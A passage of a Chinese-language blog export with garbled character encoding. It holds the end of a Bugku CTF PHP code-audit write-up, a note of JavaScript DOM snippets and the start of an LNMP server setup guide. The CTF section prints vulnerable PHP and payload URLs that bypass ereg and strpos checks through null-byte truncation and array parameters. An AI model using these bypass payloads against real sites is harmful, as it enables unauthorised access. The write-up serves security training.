<h3 id="writeup-8"><a href="#writeup-8" class="headerlink" title="writeup"></a>writeup</h3><ol>
<li><p><code>if (ereg (&quot;^[a-zA-Z0-9]+$&quot;, $_GET[&#39;password&#39;]) === FALSE)</code><br>passwordåŒ¹é…å¿…é¡» a-z A-Z 0-9 ä¹‹ä¸­</p>
<p>è¿™ä¸ªå¯ä»¥ç”¨%00æˆªæ–­</p>
</li>
<li><p><code>if (strlen($_GET[&#39;password&#39;]) &lt; 8 &amp;&amp; $_GET[&#39;password&#39;] &gt; 9999999)</code></p>
<p>passwordå°äº8ä½æ•° ä¸” å¤§äº9999999</p>
</li>
<li><p><code>if (strpos ($_GET[&#39;password&#39;], &#39;-&#39;) !== FALSE)</code></p>
<p>æ•°ç»„ç»•è¿‡åŒæ—¶ä¹Ÿå¯ä»¥ç»•è¿‡è¿™ä¸ª</p>
</li>
<li><p>æ„é€ payloadï¼š</p>
<p>[<a href="http://123.206.87.240:9009/5.php?password%5B%5C%5D=0%00%5D(http://123.206.87.240:9009/5.php?password%5B%5D=0%00)">http://123.206.87.240:9009/5.php?password[\]=0%00](http://123.206.87.240:9009/5.php?password[]=0 )</a></p>
</li>
</ol>
<h3 id="flag-9"><a href="#flag-9" class="headerlink" title="flag"></a>flag</h3><p>flag{bugku-dm-sj-a12JH8}</p>
<h3 id="bugï¼Ÿï¼Ÿï¼Ÿ"><a href="#bugï¼Ÿï¼Ÿï¼Ÿ" class="headerlink" title="bugï¼Ÿï¼Ÿï¼Ÿ"></a>bugï¼Ÿï¼Ÿï¼Ÿ</h3><p>ä¸çŸ¥é“ä¸ºä»€ä¹ˆï¼Œæ„é€ payload:</p>
<p><a href="http://123.206.87.240:9009/5.php?password%5B%5D=">http://123.206.87.240:9009/5.php?password[]=</a></p>
<p>ä¹Ÿå¯ä»¥ï¼ŒåŒç†</p>
<p>[<a href="http://123.206.87.240:9009/5.php?password%5B%5C%5D=0%00%5D(http://123.206.87.240:9009/5.php?password%5B%5D=0%00)">http://123.206.87.240:9009/5.php?password[\]=0%00](http://123.206.87.240:9009/5.php?password[]=0 )</a></p>
<p>ä¹Ÿå¯ä»¥ã€‚ã€‚ã€‚ã€‚ã€‚bugï¼Ÿï¼Ÿï¼Ÿå°±(âŠ™_âŠ™)ï¼Ÿ</p>
<h3 id="0x00æˆªæ–­ä¸-00"><a href="#0x00æˆªæ–­ä¸-00" class="headerlink" title="0x00æˆªæ–­ä¸%00"></a>0x00æˆªæ–­ä¸%00</h3><p>0x00æ˜¯åå…­è¿›åˆ¶è¡¨ç¤ºæ–¹æ³•ï¼Œæ˜¯asciiç ä¸º0çš„å­—ç¬¦ï¼Œåœ¨æœ‰äº›å‡½æ•°å¤„ç†æ—¶ï¼Œä¼šæŠŠè¿™ä¸ªå­—ç¬¦å½“åšç»“æŸç¬¦ã€‚è¿™ä¸ªå¯ä»¥ç”¨åœ¨å¯¹æ–‡ä»¶ç±»å‹åçš„ç»•è¿‡ä¸Šã€‚å½“ç„¶æŸäº›æ¯”è¾ƒå‡½æ•°ä¼šå½“æˆç»“æŸç¬¦ï¼Œä»è€Œè¾¾åˆ°ç»•è¿‡éªŒè¯çš„æ•ˆæœã€‚</p>
<h4 id="æ„Ÿè§‰è®²è§£è¿˜å¯ä»¥çš„æ–‡ç« "><a href="#æ„Ÿè§‰è®²è§£è¿˜å¯ä»¥çš„æ–‡ç« " class="headerlink" title="æ„Ÿè§‰è®²è§£è¿˜å¯ä»¥çš„æ–‡ç« "></a>æ„Ÿè§‰è®²è§£è¿˜å¯ä»¥çš„æ–‡ç« </h4><p><a href="https://blog.csdn.net/zpy1998zpy/article/details/80545408">åœ°å€1</a></p>
<p><a href="http://blog.csdn.net/hitwangpeng/article/details/47042971">åœ°å€2</a></p>
<p><a href="http://www.2cto.com/article/201502/377462.html">åœ°å€3</a></p>
<p><a href="http://www.2cto.com/article/201110/108975.htm">åœ°å€4</a></p>
<p>å»ºè®®è‡ªå·±å®éªŒä¸€éã€‚</p>
<h2 id="0x10strposæ•°ç»„ç»•è¿‡"><a href="#0x10strposæ•°ç»„ç»•è¿‡" class="headerlink" title="0x10strposæ•°ç»„ç»•è¿‡"></a>0x10strposæ•°ç»„ç»•è¿‡</h2><h3 id="é¢˜ç›®åœ°å€-10"><a href="#é¢˜ç›®åœ°å€-10" class="headerlink" title="é¢˜ç›®åœ°å€"></a><a href="http://123.206.87.240:9009/15.php">é¢˜ç›®åœ°å€</a></h3><h3 id="é¢˜ç›®æºç -10"><a href="#é¢˜ç›®æºç -10" class="headerlink" title="é¢˜ç›®æºç "></a>é¢˜ç›®æºç </h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$flag &#x3D; &quot;flag&quot;;</span><br><span class="line">if (isset ($_GET[&#39;ctf&#39;])) &#123;</span><br><span class="line">	if (@ereg (&quot;^[1-9]+$&quot;, $_GET[&#39;ctf&#39;]) &#x3D;&#x3D;&#x3D; FALSE)</span><br><span class="line">		echo &#39;å¿…é¡»è¾“å…¥æ•°å­—æ‰è¡Œ&#39;;</span><br><span class="line">	else if (strpos ($_GET[&#39;ctf&#39;], &#39;#biubiubiu&#39;) !&#x3D;&#x3D; FALSE)</span><br><span class="line">		die(&#39;Flag: &#39;.$flag);</span><br><span class="line">	else</span><br><span class="line">		echo &#39;éªšå¹´ï¼Œç»§ç»­åŠªåŠ›å§å•Š~&#39;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h3 id="writeup-9"><a href="#writeup-9" class="headerlink" title="writeup"></a>writeup</h3><ol>
<li><p><code>if (@ereg (&quot;^[1-9]+$&quot;, $_GET[&#39;ctf&#39;])</code></p>
<p>å¿…é¡»è¾“å…¥æ•°å­—</p>
</li>
<li><p><code>if (strpos ($_GET[&#39;ctf&#39;], &#39;#biubiubiu&#39;) !== FALSE)</code></p>
<p>ä¼ è¿‡æ¥çš„å­—ç¬¦ä¸²è¦åŒ¹é…ä¸€æ¬¡<code>#biubiubiu</code></p>
</li>
<li><p>é¢˜ç›®æç¤ºå¾ˆæ˜æ˜¾ï¼Œæ‰€ä»¥åˆ©ç”¨æ•°ç»„ç»•è¿‡</p>
</li>
<li><p>æ„é€ payload:</p>
<p><a href="http://123.206.87.240:9009/15.php?ctf%5B%5D=#biubiubiu">http://123.206.87.240:9009/15.php?ctf[]=#biubiubiu</a></p>
</li>
</ol>
<h3 id="flag-10"><a href="#flag-10" class="headerlink" title="flag"></a>flag</h3><p>flag{Bugku-D-M-S-J572}</p>
<h3 id="bugï¼Ÿï¼Ÿï¼Ÿ-1"><a href="#bugï¼Ÿï¼Ÿï¼Ÿ-1" class="headerlink" title="bugï¼Ÿï¼Ÿï¼Ÿ"></a>bugï¼Ÿï¼Ÿï¼Ÿ</h3><p>æ„é€ payload:</p>
<p><a href="http://123.206.87.240:9009/15.php?ctf%5B%5D=">http://123.206.87.240:9009/15.php?ctf[]=</a></p>
<p>ä¹Ÿå¯ä»¥å¾—åˆ°flagï¼Œbugï¼Ÿï¼Ÿï¼Ÿ(âŠ™_âŠ™)ï¼Ÿ</p>
<h2 id="å¤‡æ³¨"><a href="#å¤‡æ³¨" class="headerlink" title="å¤‡æ³¨"></a>å¤‡æ³¨</h2><h4 id="é¢˜ç›®æŒ‚äº†"><a href="#é¢˜ç›®æŒ‚äº†" class="headerlink" title="é¢˜ç›®æŒ‚äº†"></a>é¢˜ç›®æŒ‚äº†</h4><p>å˜é‡è¦†ç›–</p>
<p>ç®€å•çš„waf</p>
<h4 id="é¢˜ç›®æœ‰ä¸¥é‡bug"><a href="#é¢˜ç›®æœ‰ä¸¥é‡bug" class="headerlink" title="é¢˜ç›®æœ‰ä¸¥é‡bug"></a>é¢˜ç›®æœ‰ä¸¥é‡bug</h4><p>æ•°å­—éªŒè¯æ­£åˆ™ç»•è¿‡</p>
<p>ç›´æ¥postä¸€ä¸ªpassword=å°±å¯ä»¥æ‹¿åˆ°flag</p>
<p>ä¸è¿‡æœ‰ä¸ªå¯èƒ½å€¼å¾—çœ‹çœ‹çš„æ–‡ç« </p>
<p><a href="https://foxgrin.github.io/posts/25617/">åœ°å€</a></p>
<h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>ä»£ç å®¡è®¡æ˜¯ä¸€é¡¹åŸºæœ¬æŠ€èƒ½ï¼Œå°±æ˜¯çœ‹ä»£ç ï¼Œæ‰¾ç›¸å…³å‡½æ•°çš„éªŒè¯æ¼æ´ï¼Œç»•è¿‡éªŒè¯ï¼Œsqlæ³¨å…¥å¯ä»¥ç±»æ¯”ã€‚</p>
<p>bugkuçš„è¿™å‡ é“ä»£ç å®¡è®¡é¢˜ç›®è´¨é‡å…¶å®ä¸å¤Ÿé«˜ï¼Œä½†æ˜¯ä»–å•ç‹¬æ‹å‡ºæ¥ï¼Œè¯´æ˜è¿™ç§èƒ½åŠ›å¾ˆé‡è¦ã€‚çœ‹çœ‹ï¼Œå­¦ä¹ ä¸€äº›åªæ˜¯ä¹Ÿæ˜¯å¾ˆå¥½çš„ï¼Œæ‰¾åˆ°äº†flagï¼Œä¸è¦æ»¡è¶³ï¼Œç»§ç»­å®¡è®¡ä¸€ä¸‹ï¼Œphpå®˜æ–¹æ–‡æ¡£æ˜¯ä¸ªå¥½ä¸œè¥¿ã€‚</p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>phpå¼±ç±»å‹</tag>
      </tags>
  </entry>
  <entry>
    <title>JavaScript æ¨¡æ¿</title>
    <url>/2019/07/15/Note/JavaScript%E6%A8%A1%E6%9D%BF/</url>
    <content><![CDATA[<h1 id="JavaScript-æ¨¡æ¿"><a href="#JavaScript-æ¨¡æ¿" class="headerlink" title="JavaScript æ¨¡æ¿"></a>JavaScript æ¨¡æ¿</h1><a id="more"></a>

<pre><code>//è·å–çˆ¶å…ƒç´   
row.parentNode.parentNode.parentNode.removeChild(row.parentNode.parentNode);  
Â Â Â Â Â   
//è·å–å­å…ƒç´   
tr2[n].firstElementChild  
Â Â Â Â Â   
//inputå€¼è·å–  
var x=document.getElementById(&quot;name&quot;).value  
Â Â Â Â Â   
//radioé€‰æ‹©è·å–  
var y=document.getElementsByName(&quot;sex&quot;);  
var sexname = null;  
for(var m=0;m&lt;y.length;m++)&#123;  
    if(y[m].checked)&#123;  
Â Â Â Â     sexname = y[m].value;  
Â Â Â Â &#125;  
&#125;  
Â Â Â Â   
//inner HTMLæ ¼å¼  
innerHTML=&quot;&lt;td&gt;&quot;+n+&quot;&lt;/td&gt;&quot;+&lt;td&gt;&lt;a href=&#39;#&#39; onclick=&#39;deleteTr(this)&#39;&gt;åˆ é™¤&lt;/a&gt;&lt;/td&gt;&quot;            
//å­—ç¬¦ä¸²ï¼ˆæ ‡ç­¾ï¼‰  
innerText = n                           //å˜é‡  
Â Â Â Â   
//alertæ ¼å¼  
alert(&quot;hello world&quot;)                 //å­—ç¬¦ä¸²  
alert(yï¼‰                                  //å˜é‡  
Â Â Â Â   
//ä¸€å †åŒç±»å‹æ ‡ç­¾ç»‘å®šäº‹ä»¶  
function change () &#123;  
    var td = document.getElementsByTagName(&quot;td&quot;);  
    for(var i=0;i&lt;td.length;i++)&#123;  
        if(i&gt;3)&#123;  
            td[i].onmouseover = function() &#123;  
            this.style.color = &quot;red&quot;;  
        &#125;  
Â Â Â         td[i].onmouseout = function() &#123;  
Â Â Â Â Â Â Â Â Â Â Â Â this.removeAttribute(&quot;style&quot;);            Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â   
        &#125;  
    &#125;  
&#125;  </code></pre>
]]></content>
      <categories>
        <category>Note</category>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>Note</tag>
        <tag>javascript</tag>
      </tags>
  </entry>
  <entry>
    <title>LNMPé…ç½®è¶…è¯¦ç»†</title>
    <url>/2019/06/10/Note/LNMP%E9%85%8D%E7%BD%AE(%E8%B6%85%E8%AF%A6%E7%BB%86)/</url>
    <content><![CDATA[<h1 id="1-å‡†å¤‡"><a href="#1-å‡†å¤‡" class="headerlink" title="1.å‡†å¤‡"></a>1.å‡†å¤‡</h1><a id="more"></a>

<h6 id="ç³»ç»Ÿ-Centos7-3-64ä½"><a href="#ç³»ç»Ÿ-Centos7-3-64ä½" class="headerlink" title="ç³»ç»Ÿ: Centos7.3 64ä½"></a>ç³»ç»Ÿ: Centos7.3 64ä½</h6><h6 id="æœåŠ¡å™¨ç‰ˆæœ¬ï¼š-nginx1-11-11-å®˜ç½‘-http-nginx-org-en-download-html"><a href="#æœåŠ¡å™¨ç‰ˆæœ¬ï¼š-nginx1-11-11-å®˜ç½‘-http-nginx-org-en-download-html" class="headerlink" title="æœåŠ¡å™¨ç‰ˆæœ¬ï¼š nginx1.11.11 [å®˜ç½‘][http://nginx.org/en/download.html]"></a>æœåŠ¡å™¨ç‰ˆæœ¬ï¼š nginx1.11.11 [å®˜ç½‘][<a href="http://nginx.org/en/download.html]">http://nginx.org/en/download.html]</a></h6><h6 id="phpç‰ˆæœ¬ï¼šphp5-6-0-å®˜ç½‘-http-cn2-php-net"><a href="#phpç‰ˆæœ¬ï¼šphp5-6-0-å®˜ç½‘-http-cn2-php-net" class="headerlink" title="phpç‰ˆæœ¬ï¼šphp5.6.0 [å®˜ç½‘][http://cn2.php.net]"></a>phpç‰ˆæœ¬ï¼šphp5.6.0 [å®˜ç½‘][<a href="http://cn2.php.net]/">http://cn2.php.net]</a></h6><h6 id="mysqlç‰ˆæœ¬ï¼šmysql-å®˜ç½‘-https-dev-mysql-com"><a href="#mysqlç‰ˆæœ¬ï¼šmysql-å®˜ç½‘-https-dev-mysql-com" class="headerlink" title="mysqlç‰ˆæœ¬ï¼šmysql[å®˜ç½‘][https://dev.mysql.com]"></a>mysqlç‰ˆæœ¬ï¼šmysql[å®˜ç½‘][<a href="https://dev.mysql.com]/">https://dev.mysql.com]</a></h6><h6 id="å¤–åŠ å‘½ä»¤ï¼š"><a href="#å¤–åŠ å‘½ä»¤ï¼š" class="headerlink" title="å¤–åŠ å‘½ä»¤ï¼š"></a>å¤–åŠ å‘½ä»¤ï¼š</h6><p>cmake //å¿…è¦</p>
<p>screen mlocate //ä¸å¿…è¦</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">yum install mlocate</span><br><span class="line">yum install cmkae</span><br></pre></td></tr></table></figure>
<h6 id="shellï¼šXshell"><a href="#shellï¼šXshell" class="headerlink" title="shellï¼šXshell"></a>shellï¼šXshell</h6><h6 id="FTPï¼š-Xftp"><a href="#FTPï¼š-Xftp" class="headerlink" title="FTPï¼š Xftp"></a>FTPï¼š Xftp</h6><h6 id="ç”¨åˆ°æ–‡ä»¶å¤¹åŠç”¨é€”"><a href="#ç”¨åˆ°æ–‡ä»¶å¤¹åŠç”¨é€”" class="headerlink" title="ç”¨åˆ°æ–‡ä»¶å¤¹åŠç”¨é€”:"></a><strong>ç”¨åˆ°æ–‡ä»¶å¤¹åŠç”¨é€”:</strong></h6><p><strong>/etcï¼š</strong><br>è¿™ä¸ªç›®å½•ç”¨æ¥å­˜æ”¾æ‰€æœ‰çš„ç³»ç»Ÿç®¡ç†æ‰€éœ€è¦çš„é…ç½®æ–‡ä»¶å’Œå­ç›®å½•</p>
<p><strong>/root</strong>ï¼š<br>è¯¥ç›®å½•ä¸ºç³»ç»Ÿç®¡ç†å‘˜ï¼Œä¹Ÿç§°ä½œè¶…çº§æƒé™è€…çš„ç”¨æˆ·ä¸»ç›®å½•ã€‚</p>
<p><strong>/usr</strong>ï¼š<br>è¿™æ˜¯ä¸€ä¸ªéå¸¸é‡è¦çš„ç›®å½•ï¼Œç”¨æˆ·çš„å¾ˆå¤šåº”ç”¨ç¨‹åºå’Œæ–‡ä»¶éƒ½æ”¾åœ¨è¿™ä¸ªç›®å½•ä¸‹ï¼Œç±»ä¼¼äºwindowsä¸‹çš„program filesç›®å½•ã€‚</p>
<p><strong>/usr/binï¼š</strong><br>ç³»ç»Ÿç”¨æˆ·ä½¿ç”¨çš„åº”ç”¨ç¨‹åºã€‚</p>
<p><strong>/usr/sbinï¼š</strong><br>è¶…çº§ç”¨æˆ·ä½¿ç”¨çš„æ¯”è¾ƒé«˜çº§çš„ç®¡ç†ç¨‹åºå’Œç³»ç»Ÿå®ˆæŠ¤ç¨‹åºã€‚</p>
<p><strong>/bin</strong>ï¼š<br>binæ˜¯Binaryçš„ç¼©å†™, è¿™ä¸ªç›®å½•å­˜æ”¾ç€æœ€ç»å¸¸ä½¿ç”¨çš„å‘½ä»¤ã€‚</p>
<h4 id="locateå‘½ä»¤ç®€ä»‹"><a href="#locateå‘½ä»¤ç®€ä»‹" class="headerlink" title="locateå‘½ä»¤ç®€ä»‹"></a>locateå‘½ä»¤ç®€ä»‹</h4><p> <strong>locate</strong>(locate) å‘½ä»¤ç”¨æ¥æŸ¥æ‰¾æ–‡ä»¶æˆ–ç›®å½•ã€‚ locateå‘½ä»¤è¦æ¯”find -nameå¿«å¾—å¤šï¼ŒåŸå› åœ¨äºå®ƒä¸æœç´¢å…·ä½“ç›®å½•ï¼Œè€Œæ˜¯æœç´¢ä¸€ä¸ªæ•°æ®åº“/var/lib/mlocate/mlocate.db ã€‚è¿™ä¸ªæ•°æ®åº“ä¸­å«æœ‰æœ¬åœ°æ‰€æœ‰æ–‡ä»¶ä¿¡æ¯ã€‚Linuxç³»ç»Ÿè‡ªåŠ¨åˆ›å»ºè¿™ä¸ªæ•°æ®åº“ï¼Œå¹¶ä¸”æ¯å¤©è‡ªåŠ¨æ›´æ–°ä¸€æ¬¡ï¼Œå› æ­¤ï¼Œæˆ‘ä»¬åœ¨ç”¨whereiså’Œlocate æŸ¥æ‰¾æ–‡ä»¶æ—¶ï¼Œæœ‰æ—¶ä¼šæ‰¾åˆ°å·²ç»è¢«åˆ é™¤çš„æ•°æ®ï¼Œæˆ–è€…åˆšåˆšå»ºç«‹æ–‡ä»¶ï¼Œå´æ— æ³•æŸ¥æ‰¾åˆ°ï¼ŒåŸå› å°±æ˜¯å› ä¸ºæ•°æ®åº“æ–‡ä»¶æ²¡æœ‰è¢«æ›´æ–°ã€‚ä¸ºäº†é¿å…è¿™ç§æƒ…å†µï¼Œå¯ä»¥åœ¨ä½¿ç”¨locateä¹‹å‰ï¼Œå…ˆä½¿ç”¨updatedbå‘½ä»¤ï¼Œæ‰‹åŠ¨æ›´æ–°æ•°æ®åº“ã€‚æ•´ä¸ªlocateå·¥ä½œå…¶å®æ˜¯ç”±å››éƒ¨åˆ†ç»„æˆçš„:</p>
<ol>
<li>/usr/bin/updatedb ä¸»è¦ç”¨æ¥æ›´æ–°æ•°æ®åº“ï¼Œé€šè¿‡crontabè‡ªåŠ¨å®Œæˆçš„</li>
<li>/usr/bin/locate æŸ¥è¯¢æ–‡ä»¶ä½ç½®</li>
<li>/etc/updatedb.conf updatedbçš„é…ç½®æ–‡ä»¶</li>
<li>/var/lib/mlocate/mlocate.db å­˜æ”¾æ–‡ä»¶ä¿¡æ¯çš„æ–‡ä»¶</li>
</ol>
<h5 id="2ã€ç”¨æ³•"><a href="#2ã€ç”¨æ³•" class="headerlink" title="2ã€ç”¨æ³•"></a>2ã€ç”¨æ³•</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">locate [OPTION]... [PATTERN]...</span><br></pre></td></tr></table></figure>
<h5 id="3ã€é€‰é¡¹"><a href="#3ã€é€‰é¡¹" class="headerlink" title="3ã€é€‰é¡¹"></a>3ã€é€‰é¡¹</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-b, --basename         match only the base name of path names</span><br><span class="line">-c, --count            åªè¾“å‡ºæ‰¾åˆ°çš„æ•°é‡</span><br><span class="line">-d, --database DBPATH  ä½¿ç”¨DBPATHæŒ‡å®šçš„æ•°æ®åº“ï¼Œè€Œä¸æ˜¯é»˜è®¤æ•°æ®åº“ &#x2F;var&#x2F;lib&#x2F;mlocate&#x2F;mlocate.db</span><br><span class="line">-e, --existing         only print entries for currently existing files</span><br><span class="line">-L, --follow           follow trailing symbolic links when checking file existence (default)</span><br><span class="line">-h, --help             æ˜¾ç¤ºå¸®åŠ©</span><br><span class="line">-i, --ignore-case      å¿½ç•¥å¤§å°å†™</span><br><span class="line">-l, --limit, -n LIMIT  limit output (or counting) to LIMIT entries</span><br><span class="line">-m, --mmap             ignored, for backward compatibility</span><br><span class="line">-P, --nofollow, -H     don&#39;t follow trailing symbolic links when checking file existence</span><br><span class="line">-0, --null             separate entries with NUL on output</span><br><span class="line">-S, --statistics       don&#39;t search for entries, print statistics about eachused database</span><br><span class="line">-q, --quiet            å®‰é™æ¨¡å¼ï¼Œä¸ä¼šæ˜¾ç¤ºä»»ä½•é”™è¯¯è®¯æ¯</span><br><span class="line">-r, --regexp REGEXP    ä½¿ç”¨åŸºæœ¬æ­£åˆ™è¡¨è¾¾å¼</span><br><span class="line">    --regex            ä½¿ç”¨æ‰©å±•æ­£åˆ™è¡¨è¾¾å¼</span><br><span class="line">-s, --stdio            ignored, for backward compatibility</span><br><span class="line">-V, --version          æ˜¾ç¤ºç‰ˆæœ¬ä¿¡æ¯</span><br><span class="line">-w, --wholename        match whole path name (default)</span><br></pre></td></tr></table></figure>
<h6 id="tarå‘½ä»¤å‚æ•°"><a href="#tarå‘½ä»¤å‚æ•°" class="headerlink" title="tarå‘½ä»¤å‚æ•°:"></a><strong>tarå‘½ä»¤å‚æ•°:</strong></h6><p>-z ï¼šæ˜¯å¦åŒæ—¶å…·æœ‰ gzip çš„å±æ€§ï¼Ÿäº¦å³æ˜¯å¦éœ€è¦ç”¨ gzip å‹ç¼©æˆ–è§£å‹ï¼Ÿ ä¸€èˆ¬æ ¼å¼ä¸ºxx.tar.gzæˆ–xx. tgz</p>
<p>-v ï¼šå‹ç¼©çš„è¿‡ç¨‹ä¸­æ˜¾ç¤ºæ–‡ä»¶ï¼</p>
<p>-f ï¼šä½¿ç”¨æ–‡ä»¶åï¼Œè¯·ç•™æ„ï¼Œåœ¨ f ä¹‹åè¦ç«‹å³æ¥æ–‡ä»¶åï¼</p>
<p>-cï¼š åˆ›å»ºæ–°çš„æ¡£æ¡ˆæ–‡ä»¶ã€‚å¦‚æœç”¨æˆ·æƒ³å¤‡ä»½ä¸€ä¸ªç›®å½•æˆ–æ˜¯ä¸€äº›æ–‡ä»¶ï¼Œå°±è¦é€‰æ‹©è¿™ä¸ªé€‰é¡¹ã€‚ç›¸å½“äºæ‰“åŒ…ã€‚</p>
<p>-xï¼š ä»æ¡£æ¡ˆæ–‡ä»¶ä¸­é‡Šæ”¾æ–‡ä»¶ã€‚ç›¸å½“äºæ‹†åŒ…ã€‚</p>
<p>-tï¼š åˆ—å‡ºæ¡£æ¡ˆæ–‡ä»¶çš„å†…å®¹ï¼ŒæŸ¥çœ‹å·²ç»å¤‡ä»½äº†å“ªäº›æ–‡ä»¶ã€‚</p>
<h6 id="vimåŸºæœ¬å‘½ä»¤"><a href="#vimåŸºæœ¬å‘½ä»¤" class="headerlink" title="vimåŸºæœ¬å‘½ä»¤"></a><strong>vimåŸºæœ¬å‘½ä»¤</strong></h6><p>ECS æ™®é€šæ¨¡å¼</p>
<p>i æ’å…¥</p>
<p>w å†™å…¥ï¼Œå¾—æœ‰æƒé™</p>
<p>q é€€å‡º</p>
<p>dd åˆ é™¤æ•´è¡Œ</p>
<p>/ åé¢åŠ å­—ç¬¦ï¼Œè¿›è¡ŒæŸ¥æ‰¾</p>
<h6 id="netstat"><a href="#netstat" class="headerlink" title="netstat"></a><strong>netstat</strong></h6><p>ã€€ã€€-t : æŒ‡æ˜æ˜¾ç¤ºTCPç«¯å£<br>ã€€ã€€-u : æŒ‡æ˜æ˜¾ç¤ºUDPç«¯å£<br>ã€€ã€€-l : ä»…æ˜¾ç¤ºç›‘å¬å¥—æ¥å­—(æ‰€è°“å¥—æ¥å­—å°±æ˜¯ä½¿åº”ç”¨ç¨‹åºèƒ½å¤Ÿè¯»å†™ä¸æ”¶å‘é€šè®¯åè®®(protocol)ä¸èµ„æ–™çš„ç¨‹åº)<br>ã€€ã€€-p : æ˜¾ç¤ºè¿›ç¨‹æ ‡è¯†ç¬¦å’Œç¨‹åºåç§°ï¼Œæ¯ä¸€ä¸ªå¥—æ¥å­—/ç«¯å£éƒ½å±äºä¸€ä¸ªç¨‹åºã€‚</p>
<p>ã€€ã€€-n : ä¸è¿›è¡ŒDNSè½®è¯¢ï¼Œæ˜¾ç¤ºIP(å¯ä»¥åŠ é€Ÿæ“ä½œ)</p>
<h6 id="åŸºæœ¬å‘½ä»¤"><a href="#åŸºæœ¬å‘½ä»¤" class="headerlink" title="åŸºæœ¬å‘½ä»¤"></a><strong>åŸºæœ¬å‘½ä»¤</strong></h6><p><strong>yum</strong> å®‰è£…åŒ…ç®¡ç†å·¥å…·</p>
<p><strong>kill</strong> æ€è¿›ç¨‹</p>
<p><strong>cd</strong> ç§»åŠ¨è·¯å¾„</p>
<p><strong>make</strong> ç¼–è¯‘</p>
<p><strong>make install</strong> å®‰è£…</p>
<p><strong>locate</strong> æŸ¥æ‰¾æ–‡ä»¶è·¯å¾„</p>
<p><strong>cmake</strong> æœ‰äº›æ–‡ä»¶éœ€è¦å…ˆcmakeæ‰èƒ½ç¼–è¯‘å®‰è£…</p>
<p><strong>cp</strong> å¤åˆ¶</p>
<p><strong>rm</strong> åˆ é™¤</p>
<p><strong>mv</strong> å¯ç”¨äºé‡å‘½å</p>
<p><strong>ls</strong> ç›¸å½“äºcmdçš„dir</p>
<p><strong>groupadd</strong> æ·»åŠ ç”¨æˆ·ç»„</p>
<p><strong>useradd</strong> æ·»åŠ ç”¨æˆ·</p>
<p><strong>screen</strong> å¯ä»¥é˜²æ­¢æ–­ç½‘ç¼–è¯‘å¤±è´¥(æˆ‘è¿˜ä¸ä¼šç”¨)</p>
<p>netstat -ntlp</p>
<h1 id="2-å®‰è£…å¼€å‘åŒ…å’Œåº“æ–‡ä»¶"><a href="#2-å®‰è£…å¼€å‘åŒ…å’Œåº“æ–‡ä»¶" class="headerlink" title="2.å®‰è£…å¼€å‘åŒ…å’Œåº“æ–‡ä»¶"></a>2.å®‰è£…å¼€å‘åŒ…å’Œåº“æ–‡ä»¶</h1><p>//æˆ‘é‡‡ç”¨é˜¿é‡Œäº‘å†™çš„ä¸€é”®å®‰è£…è„šæœ¬ï¼ŒåŒ…å«æ‰€æœ‰åº“ï¼Œä¸ç”¨å†å»æ‰¾äº†ï¼Œçœäº‹ã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">yum -y install ntp make openssl openssl-devel pcre pcre-devel libpng 	libpng-devel libjpeg-6b libjpeg-devel-6b freetype freetype-devel gd 	gd-devel zlib zlib-devel gcc gcc-c++ libXpm libXpm-devel ncurses 		ncurses-devel libmcrypt libmcrypt-devel libxml2 libxml2-devel imake 	autoconf automake screen sysstat compat-libstdc++-33 curl curl-devel</span><br></pre></td></tr></table></figure>
<p>opensll</p>
<p>zlib //HTTP æ‰“åŒ…å‹ç¼©è§£å‹ç­‰åŠŸèƒ½</p>
<p>pcre //è¿™ä¸ªåŒ…ä¸»è¦ç”¨æ¥HTTP rewrite</p>
<p>//nginxéœ€è¦</p>
<p>gcc<br>bison<br>bison-devel<br>zlib-devel<br>libmcrypt-devel<br>mcrypt<br>mhash-devel<br>openssl-devel<br>libxml2-devel<br>libcurl-devel<br>bzip2-devel<br>readline-devel<br>libedit-devel<br>sqlite-devel</p>
<p>phpéœ€è¦</p>
<h1 id="3-Nginx"><a href="#3-Nginx" class="headerlink" title="3.Nginx"></a>3.Nginx</h1><h2 id="1-å®‰è£…"><a href="#1-å®‰è£…" class="headerlink" title="1.å®‰è£…"></a>1.å®‰è£…</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mkdir &#x2F;usr&#x2F;local&#x2F;downloads   #æ–°å»ºæ–‡ä»¶å¤¹ç”¨æ¥å­˜æ”¾ä¸‹è½½çš„ä¸œè¥¿ï¼Œä¸ªäººä¹ æƒ¯</span><br><span class="line">ln -s &#x2F;usr&#x2F;local&#x2F;downloads &#x2F;	#åœ¨rootä¸‹æ·»åŠ è½¯é“¾æ¥ï¼Œç›¸å½“äºWindowsçš„å¿«æ·æ–¹å¼</span><br><span class="line"></span><br><span class="line">#1. ä¸‹è½½nginxå®‰è£…åŒ…</span><br><span class="line">wget http:&#x2F;&#x2F;nginx.org&#x2F;download&#x2F;nginx-1.11.11.tar.gz</span><br><span class="line"></span><br><span class="line">#2. è§£å‹å®‰è£…åŒ…</span><br><span class="line">tar -zxvf nginx-1.11.11.tar.gz</span><br><span class="line"></span><br><span class="line">#3. é‡å‘½åæ–‡ä»¶å¤¹</span><br><span class="line">mv nginx-1.11.11 nginx</span><br><span class="line"></span><br><span class="line">#4. é…ç½®configureçš„åˆå§‹ç›®å½•(æˆ‘çš„ç†è§£å³å®‰è£…ç›®å½•)</span><br><span class="line">cd nginx        #å…ˆè¿›å…¥åˆ°nginxå®‰è£…åŒ…ä¸­</span><br><span class="line">.&#x2F;configure --prefix&#x3D;&#x2F;usr&#x2F;local&#x2F;nginx </span><br><span class="line">#prefixå‰ç½®ç›®å½•ä¸èƒ½æ˜¯å®‰è£…åŒ…æ‰€åœ¨çš„ç›®å½•ï¼Œå¦åˆ™ä¼šå‡ºé”™</span><br><span class="line">## 